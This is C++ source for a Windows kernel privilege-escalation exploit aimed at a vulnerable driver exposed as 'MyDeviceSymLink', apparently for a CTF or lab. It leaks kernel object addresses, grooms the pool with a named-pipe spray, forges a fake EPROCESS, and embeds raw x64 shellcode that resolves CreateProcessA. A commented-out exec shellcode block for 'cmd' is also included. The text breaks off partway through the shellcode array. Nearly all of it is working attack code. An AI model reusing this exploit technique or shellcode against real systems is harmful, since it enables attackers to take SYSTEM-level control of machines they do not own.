#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <winioctl.h>
#include <psapi.h>
#pragma comment (lib, "ntdll")

#define err_exit(msg) \
    do { \
       printf("[x] %s in %s: %d\n", msg, FILENAME(__FILE__), __LINE__); \
	   exit(-1); \
    } while (0)


#define FILENAME(file) (strrchr(file, '\\') ? strrchr(file, '\\') + 1 : file)

#define info(fmt, ...) \
    do { \
            printf(fmt"  [%s: %d]\n", ##__VA_ARGS__, FILENAME(__FILE__), __LINE__); \
    } while (0)

void binary_dump(const char *desc, void *addr, int len) {
	uint64_t *buf64 = (uint64_t *)addr;
	uint8_t *buf8 = (uint8_t *)addr;
	if (desc != NULL) {
		printf("[*] %s:\n", desc);
	}
	for (int i = 0; i < len / 8; i += 4) {
		printf("  %04x", i * 8);
		for (int j = 0; j < 4; j++) {
			i + j < len / 8 ? printf(" 0x%016llx", buf64[i + j]) : printf("                   ");
		}
		printf("   ");
		for (int j = 0; j < 32 && j + i * 8 < len; j++) {
			printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
		}
		puts("");
	}
}

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct __SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum __SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS_EX;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS_EX SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);

uint64_t sysProc;
uint64_t curProc;
uint64_t curThread;
int getObject(uint64_t *pAddress, uint32_t Pid, uint64_t Handle)
{
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		err_exit("GetProcAddress() failed");
	}
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		err_exit("NtQuerySystemInformation failed");
	}
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		HANDLE handle = pHandleInfo->Handles[i].HandleValue;
		HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
		if (pid == (HANDLE)Pid && handle == (HANDLE)Handle) {
			*pAddress = (uint64_t)object;
			printf("[+] PID: %d\t", pid);
			printf("Object: %#llx\t", object);
			printf("Handle: %#x\r\n", handle);
			break;
		}
	}
	return 0;
}

typedef struct Request {
	uint64_t idx;
	uint64_t size;
	PVOID data;
} Request, *PRequest;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

HANDLE hDevice = NULL;
struct Address {
	uint64_t sysProc;
	uint64_t curProc;
	uint64_t curThread;
	uint64_t curToken;
};
struct Address address;

void init() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	hDevice = CreateFileA("\\\\.\\MyDeviceSymLink",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);


	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) {
		std::cout << "[+] Failed to get handle\n";
		exit(-1);
	}

	HANDLE hToken = INVALID_HANDLE_VALUE;
	if (!OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &hToken)) {
		err_exit("Failed to OpenProcessToken");
	}

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	HANDLE hCurProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());

	getObject(&address.sysProc, 4, 4);
	getObject(&address.curProc, GetCurrentProcessId(), (uint64_t)hCurProc);
	getObject(&address.curThread, GetCurrentProcessId(), (uint64_t)hThread);
	getObject(&address.curToken, GetCurrentProcessId(), (uint64_t)hToken);
}

#define ADD		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DELE	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define EDIT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define SHOW	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define TAG 0x41424241

typedef struct HANDLES {
	HANDLE r;
	HANDLE w;
}HANDLES;

typedef struct sprayPipeHandles {
	uint64_t size;
	uint64_t count;
	HANDLES handles[1];
}PipeHandles;

PipeHandles* InitSprayPipe(ULONG32 size, int nums) {
	info("[+] Init SprayPipe status");
	BOOL res;
	ULONG32 payloadSize = size - 0x40;
	PipeHandles* pHandles = (PipeHandles*)malloc(sizeof(PipeHandles) + (nums - 1) * sizeof(HANDLES));

	pHandles->size = size;
	pHandles->count = nums;

	for (int i = 0; i < nums; i++) {
		HANDLE readPipe, writePipe;
		res = CreatePipe(&readPipe, &writePipe, NULL, payloadSize);
		if (res == FALSE) {
			err_exit("CreatePipe failed");
		}
		pHandles->handles[i].r = readPipe;
		pHandles->handles[i].w = writePipe;
	}

	return pHandles;
}

void SprayPipe(PipeHandles* pHandles) {
	info("[+] Spray NpFr to groom pool");
	BOOL res;
	DWORD resultLength = 0;
	ULONG32 payloadSize = pHandles->size - 0x40;
	UCHAR* payload = (UCHAR*)malloc(payloadSize);

	if (payload == NULL) {
		err_exit("malloc failed");
	}
	memset(payload, 'A', payloadSize);
	for (int i = 0; i < pHandles->count; i++) {
		res = WriteFile(pHandles->handles[i].w, payload, payloadSize, &resultLength, NULL);
		if (res == FALSE) {
			err_exit("WriteFile failed");
		}
	}
	free(payload);
}

void closePipes(PipeHandles* pHandles) {
	for (int i = 0; i < pHandles->count; i++) {
		CloseHandle(pHandles->handles[i].r);
		CloseHandle(pHandles->handles[i].w);
	}
	free(pHandles);
}

typedef struct request {
	DWORD64 size;
	void* buffer;
}request;

void add(DWORD64 size) {
	DWORD retLength = 0;
	DWORD64 address = 0;
	request req = { size, NULL };
	DeviceIoControl(hDevice, ADD, &req, sizeof(request), &address, 8, &retLength, NULL);
	printf("[+] chunk address: %p\n", address);
}

void dele() {
	DWORD retLength = 0;
	request req = { 0, NULL };
	DeviceIoControl(hDevice, DELE, &req, sizeof(request), NULL, 0, &retLength, NULL);
}

void edit(DWORD64 size, void* buffer) {
	DWORD retLength = 0;
	DWORD64 address = 0;
	request req = { size, buffer };
	DeviceIoControl(hDevice, EDIT, &req, sizeof(request), NULL, 0, &retLength, NULL);
}

DWORD64 FAKE_EPROCESS_HEADER = 0;
DWORD64 FAKE_EPROCESS_ADDRESS = 0;
void create_fakeEprocess(DWORD64 target_address) {
	char *header = (char*)GlobalAlloc(GMEM_ZEROINIT, 0x1000);
	char *body = header + 0x30;
	FAKE_EPROCESS_HEADER = (DWORD64)header;
	FAKE_EPROCESS_ADDRESS = (DWORD64)body;

	header[0] = 0x60;
	body[0] = 3;
	*(DWORD64*)(body + 0x1c0) = target_address;
	printf("[+] FAKE_EPROCESS_ADDRESS: %p\n", FAKE_EPROCESS_ADDRESS);
}

BOOLEAN checkPrivilege(char* privilegeName) {
	HANDLE hToken;
	LUID luid;
	PRIVILEGE_SET ps;
	BOOL res = FALSE;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		info("[-] Failed to OpenProcessToken to get hToken");
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
		info("[-] Failed to LookupPrivilegeValue to get SeDebugPrivilege LUID");
		CloseHandle(hToken);
		return FALSE;
	}

	ps.PrivilegeCount = 1;
	ps.Control = PRIVILEGE_SET_ALL_NECESSARY;
	ps.Privilege[0].Luid = luid;
	ps.Privilege[0].Attributes = 0;

	if (!PrivilegeCheck(hToken, &ps, &res)) {
		info("[-] Failed to PrivilegeCheck to Check Privilege");
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return res;
}

DWORD getProcessId(const char* processName) {
	DWORD pids[4096] = { 0 };
	DWORD len = 0;
	if (!EnumProcesses(pids, sizeof(pids), &len)) {
		err_exit("Failed to enum all process pids");
	}

	for (int i = 0; i < len / sizeof(DWORD); i++) {
		if (pids[i] != 0) {
			DWORD pid = pids[i];
			char searchName[MAX_PATH] = { 0 };
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
			if (hProcess != NULL) {
				HMODULE hModule;
				DWORD cb;
				if (EnumProcessModules(hProcess, &hModule, sizeof(hModule), &cb)) {
					GetModuleBaseNameA(hProcess, hModule, searchName, sizeof(searchName));
					if (!strcmp(processName, searchName)) {
						return pid;
					}
				}
			}
		}
	}
	return 0;
}

void escalate() {
	DWORD pid = 0;
	PVOID remoteAddress = NULL;
	HANDLE processHandle = INVALID_HANDLE_VALUE;
	HMODULE hKernel32 = GetModuleHandle("Kernel32");
	/*
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x00";
	*/

	unsigned char shellcode[] = {
		0x40, 0x57, 0x48, 0x81, 0xEC, 0x00, 0x02, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B,
		0x40, 0x60, 0x48, 0x89, 0x84, 0x24, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x58, 0x01,
		0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x84, 0x24, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8B,
		0x84, 0x24, 0x38, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x20, 0x48, 0x89, 0x84, 0x24, 0xE8, 0x00,
		0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xB8, 0x00,
		0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x84,
		0x24, 0xB8, 0x00, 0x00, 0x00, 0xC6, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x6B, 0xC6, 0x84, 0x24,
		0x81, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24, 0x82, 0x00, 0x00, 0x00, 0x72, 0xC6, 0x84, 0x24,
		0x83, 0x00, 0x00, 0x00, 0x6E, 0xC6, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24,
		0x85, 0x00, 0x00, 0x00, 0x6C, 0xC6, 0x84, 0x24, 0x86, 0x00, 0x00, 0x00, 0x33, 0xC6, 0x84, 0x24,
		0x87, 0x00, 0x00, 0x00, 0x32, 0xC6, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x2E, 0xC6, 0x84, 0x24,
		0x89, 0x00, 0x00, 0x00, 0x64, 0xC6, 0x84, 0x24, 0x8A, 0x00, 0x00, 0x00, 0x6C, 0xC6, 0x84, 0x24,
		0x8B, 0x00, 0x00, 0x00, 0x6C, 0xC6, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x84, 0x24,
		0x90, 0x00, 0x00, 0x00, 0x4B, 0xC6, 0x84, 0x24, 0x91, 0x00, 0x00, 0x00, 0x45, 0xC6, 0x84, 0x24,
		0x92, 0x00, 0x00, 0x00, 0x52, 0xC6, 0x84, 0x24, 0x93, 0x00, 0x00, 0x00, 0x4E, 0xC6, 0x84, 0x24,
		0x94, 0x00, 0x00, 0x00, 0x45, 0xC6, 0x84, 0x24, 0x95, 0x00, 0x00, 0x00, 0x4C, 0xC6, 0x84, 0x24,
		0x96, 0x00, 0x00, 0x00, 0x33, 0xC6, 0x84, 0x24, 0x97, 0x00, 0x00, 0x00, 0x32, 0xC6, 0x84, 0x24,
		0x98, 0x00, 0x00, 0x00, 0x2E, 0xC6, 0x84, 0x24, 0x99, 0x00, 0x00, 0x00, 0x44, 0xC6, 0x84, 0x24,
		0x9A, 0x00, 0x00, 0x00, 0x4C, 0xC6, 0x84, 0x24, 0x9B, 0x00, 0x00, 0x00, 0x4C, 0xC6, 0x84, 0x24,
		0x9C, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x60, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B,
		0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x89, 0x84, 0x24, 0xF8, 0x01,
		0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x83, 0xE8, 0x10, 0x48, 0x89,
		0x84, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B,
		0x00, 0x48, 0x89, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x54, 0x00, 0x00, 0x00,
		0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x54, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x54, 0x83, 0x7C, 0x24,
		0x54, 0x0C, 0x7D, 0x78, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x63, 0x4C,
		0x24, 0x54, 0x48, 0x8B, 0x94, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x02, 0x60, 0x0F,
		0xB7, 0x04, 0x48, 0x48, 0x63, 0x4C, 0x24, 0x54, 0x0F, 0xBE, 0x8C, 0x0C, 0x80, 0x00, 0x00, 0x00,
		0x3B, 0xC1, 0x74, 0x32, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x63, 0x4C,
		0x24, 0x54, 0x48, 0x8B, 0x94, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x02, 0x60, 0x0F,
		0xB7, 0x04, 0x48, 0x48, 0x63, 0x4C, 0x24, 0x54, 0x0F, 0xBE, 0x8C, 0x0C, 0x90, 0x00, 0x00, 0x00,
		0x3B, 0xC1, 0x74, 0x02, 0xEB, 0x16, 0x48, 0x8B, 0x84, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8B,
		0x40, 0x30, 0x48, 0x89, 0x44, 0x24, 0x60, 0xE9, 0x77, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0x7C, 0x24,
		0x60, 0x00, 0x74, 0x02, 0xEB, 0x19, 0x48, 0x8B, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B,
		0x8C, 0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x39, 0x08, 0x0F, 0x85, 0x23, 0xFF, 0xFF, 0xFF, 0x48,
		0xC7, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0xC0,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,
		0xC7, 0x84, 0x24, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x48,
		0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x89, 0x84, 0x24,
		0x10, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0x48, 0x63, 0x40, 0x3C,
		0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8D, 0x44, 0x01, 0x04, 0x48, 0x89, 0x84, 0x24, 0xC0, 0x00,
		0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x14, 0x48, 0x89,
		0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x0F, 0xB7,
		0x40, 0x10, 0x48, 0x8B, 0x8C, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
		0x48, 0x89, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00,
		0x0F, 0xB7, 0x40, 0x02, 0xFF, 0xC8, 0x48, 0x98, 0x48, 0x6B, 0xC0, 0x28, 0x48, 0x8B, 0x8C, 0x24,
		0xF0, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x84, 0x24, 0x40, 0x01,
		0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x40, 0x02, 0x48, 0x6B,
		0xC0, 0x28, 0x48, 0x8B, 0x8C, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
		0x48, 0x89, 0x84, 0x24, 0x48, 0x01, 0x00, 0x00, 0xC6, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x43,
		0xC6, 0x84, 0x24, 0xA1, 0x00, 0x00, 0x00, 0x72, 0xC6, 0x84, 0x24, 0xA2, 0x00, 0x00, 0x00, 0x65,
		0xC6, 0x84, 0x24, 0xA3, 0x00, 0x00, 0x00, 0x61, 0xC6, 0x84, 0x24, 0xA4, 0x00, 0x00, 0x00, 0x74,
		0xC6, 0x84, 0x24, 0xA5, 0x00, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24, 0xA6, 0x00, 0x00, 0x00, 0x50,
		0xC6, 0x84, 0x24, 0xA7, 0x00, 0x00, 0x00, 0x72, 0xC6, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x6F,
		0xC6, 0x84, 0x24, 0xA9, 0x00, 0x00, 0x00, 0x63, 0xC6, 0x84, 0x24, 0xAA, 0x00, 0x00, 0x00, 0x65,
		0xC6, 0x84, 0x24, 0xAB, 0x00, 0x00, 0x00, 0x73, 0xC6, 0x84, 0x24, 0xAC, 0x00, 0x00, 0x00, 0x73,
		0xC6, 0x84, 0x24, 0xAD, 0x00, 0x00, 0x00, 0x41, 0xC6, 0x84, 0x24, 0xAE, 0x00, 0x00, 0x00, 0x00,
		0xC6, 0x44, 0x24, 0x70, 0x43, 0xC6, 0x44, 0x24, 0x71, 0x6C, 0xC6, 0x44, 0x24, 0x72, 0x6F, 0xC6,
		0x44, 0x24, 0x73, 0x73, 0xC6, 0x44, 0x24, 0x74, 0x65, 0xC6, 0x44, 0x24, 0x75, 0x48, 0xC6, 0x44,
		0x24, 0x76, 0x61, 0xC6, 0x44, 0x24, 0x77, 0x6E, 0xC6, 0x44, 0x24, 0x78, 0x64, 0xC6, 0x44, 0x24,
		0x79, 0x6C, 0xC6, 0x44, 0x24, 0x7A, 0x65, 0xC6, 0x44, 0x24, 0x7B, 0x00, 0x48, 0x8D, 0x84, 0x24,
		0xA0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24,
		0x70, 0x48, 0x89, 0x84, 0x24, 0xD8, 0x01, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xF8, 0x00, 0x00, 0x00,
		0x0E, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xFC, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x48,
		0xC7, 0x84, 0x24, 0x28, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x30,
		0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0x02,
		0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x8C, 0x24,
		0xC8, 0x00, 0x00, 0x00, 0x83, 0x7C, 0x01, 0x70, 0x00, 0x0F, 0x84, 0xE5, 0x01, 0x00, 0x00, 0xC7,
		0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48,
		0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x01, 0x70, 0x48,
		0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x84, 0x24, 0xD0, 0x00,
		0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x24, 0x89, 0x84, 0x24,
		0x0C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x1C, 0x89,
		0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x8B, 0x40,
		0x20, 0x89, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x5C, 0x00, 0x00, 0x00, 0x00,
		0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x5C, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x5C, 0x48, 0x8B, 0x84, 0x24,
		0xD0, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x18, 0x39, 0x44, 0x24, 0x5C, 0x0F, 0x83, 0x53, 0x01, 0x00,
		0x00, 0x8B, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03, 0xC8,
		0x48, 0x8B, 0xC1, 0x8B, 0x4C, 0x24, 0x5C, 0xC1, 0xE1, 0x02, 0x8B, 0xC9, 0x8B, 0x04, 0x08, 0x89,
		0x84, 0x24, 0x04, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A,
		0x8B, 0x44, 0x24, 0x50, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x50, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x3B,
		0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0x0F, 0x83, 0xEF, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x50,
		0x48, 0x83, 0xBC, 0xC4, 0x28, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x85, 0xD7, 0x00, 0x00, 0x00, 0xC7,
		0x44, 0x24, 0x58, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x58, 0xFF, 0xC0, 0x89,
		0x44, 0x24, 0x58, 0x8B, 0x44, 0x24, 0x50, 0x8B, 0x84, 0x84, 0xF8, 0x00, 0x00, 0x00, 0x39, 0x44,
		0x24, 0x58, 0x0F, 0x8D, 0xAE, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x63, 0x4C, 0x24,
		0x58, 0x48, 0x8B, 0x84, 0xC4, 0xD0, 0x01, 0x00, 0x00, 0x0F, 0xBE, 0x04, 0x08, 0x8B, 0x8C, 0x24,
		0x04, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x60, 0x48, 0x03, 0xD1, 0x48, 0x8B, 0xCA, 0x48,
		0x63, 0x54, 0x24, 0x58, 0x0F, 0xBE, 0x0C, 0x11, 0x3B, 0xC1, 0x74, 0x02, 0xEB, 0x78, 0x8B, 0x44,
		0x24, 0x50, 0x8B, 0x84, 0x84, 0xF8, 0x00, 0x00, 0x00, 0xFF, 0xC8, 0x39, 0x44, 0x24, 0x58, 0x75,
		0x60, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xFF, 0xC0, 0x89, 0x84, 0x24, 0xB0, 0x00, 0x00,
		0x00, 0x8B, 0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03, 0xC8,
		0x48, 0x8B, 0xC1, 0x8B, 0x8C, 0x24, 0x0C, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x60, 0x48,
		0x03, 0xD1, 0x48, 0x8B, 0xCA, 0x8B, 0x54, 0x24, 0x5C, 0xD1, 0xE2, 0x8B, 0xD2, 0x0F, 0xB7, 0x0C,
		0x11, 0xC1, 0xE1, 0x02, 0x48, 0x63, 0xC9, 0x8B, 0x04, 0x08, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48,
		0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x84, 0xCC, 0x28, 0x01, 0x00,
		0x00, 0xE9, 0x33, 0xFF, 0xFF, 0xFF, 0xE9, 0xF5, 0xFE, 0xFF, 0xFF, 0x48, 0x63, 0x84, 0x24, 0xB0,
		0x00, 0x00, 0x00, 0x48, 0x3B, 0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0x75, 0x02, 0xEB, 0x05, 0xE9,
		0x8E, 0xFE, 0xFF, 0xFF, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x84,
		0x04, 0x28, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x50, 0x01, 0x00, 0x00, 0xB8, 0x08, 0x00,
		0x00, 0x00, 0x48, 0x6B, 0xC0, 0x01, 0x48, 0x8B, 0x84, 0x04, 0x28, 0x01, 0x00, 0x00, 0x48, 0x89,
		0x84, 0x24, 0x20, 0x01, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x60, 0x01, 0x00, 0x00, 0x68, 0x00, 0x00,
		0x00, 0x48, 0xC7, 0x84, 0x24, 0x68, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84,
